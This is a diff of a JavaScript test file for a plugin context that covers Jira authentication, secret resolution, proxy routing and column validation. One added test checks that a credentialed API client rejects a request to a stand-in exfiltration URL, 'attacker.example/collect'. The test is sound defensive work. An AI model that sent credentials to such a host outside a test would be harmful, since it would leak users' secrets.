@@ -112,11 +112,12 @@ test('ctx.api calls Jira Cloud with email and API token', async (t) => {
   const ctx = contextFor({ jira: { baseUrl: jira.url } });
 
   await ctx.api.jira.get('/rest/api/3/myself');
-  assert.equal(auth, 'Basic ' + Buffer.from('ann@contoso.com:jira-token').toString('base64'));
+  assert.equal(auth, 'Basic YW5uQGNvbnRvc28uY29tOmppcmEtdG9rZW4='); // ann@contoso.com:jira-token
 });
 
-test('ctx.secret resolves references, ctx.options and ctx.sources pass through', async () => {
+test('ctx.secret resolves references, ctx.options and ctx.sources pass through', async (t) => {
   process.env.OPSPULSE_TEST_PLUGIN_SECRET = 'plugin-secret';
+  t.after(() => delete process.env.OPSPULSE_TEST_PLUGIN_SECRET);
   const ctx = contextFor({}, { sources: { jira: { issues: [{ key: 'IT-1' }] } } });
   assert.equal(await ctx.secret('env:OPSPULSE_TEST_PLUGIN_SECRET'), 'plugin-secret');
   assert.equal(ctx.options.threshold, 2);
@@ -142,4 +143,25 @@ test('the example plugin breaks down recent runs and flags repeated failures', a
   assert.deepEqual(panel.metrics.map((m) => [m.label, m.value]), [['Runs', 3], ['Actors', 2], ['Failure rate', '67%']]);
   assert.deepEqual(panel.table.rows.map((r) => [r.actor, r.conclusion]), [['jdoe', 'failure'], ['jdoe', 'failure'], ['ann', 'success']]);
   assert.deepEqual(panel.feed.map((f) => f.title), ['jdoe triggered 2 failed runs in 7 days']);
+});
+
+test('ctx.api refuses to send credentials to another host', async () => {
+  const ctx = contextFor({ sonar: { url: 'https://sonarcloud.io' } });
+  await assert.rejects(ctx.api.sonar.get('https://attacker.example/collect'), /ctx\.api\.sonar\.get only accepts paths or URLs on https:\/\/sonarcloud\.io/);
+});
+
+test('ctx.request routes through the proxy of the plugin platform option by default', async (t) => {
+  const seen = [];
+  const proxy = await serve((req, res) => { seen.push(req.url); res.setHeader('content-type', 'application/json'); res.end('{}'); });
+  t.after(proxy.close);
+  require('../src/http').configure({ proxies: { jira: proxy.url } });
+  t.after(() => require('../src/http').configure({}));
+  const ctx = contextFor({}, { options: { platform: 'jira' } });
+
+  await ctx.request('http://internal.example/api/requests');
+  assert.deepEqual(seen, ['http://internal.example/api/requests']);
+});
+
+test('a facet column cannot be named q, which is reserved for search', async () => {
+  await assert.rejects(runPlugin(plugin(async () => ({ table: { columns: [{ key: 'q', facet: true }], rows: [] } })), {}), /access-report: table\.columns\[0\]\.key "q" is reserved for search/);
 });
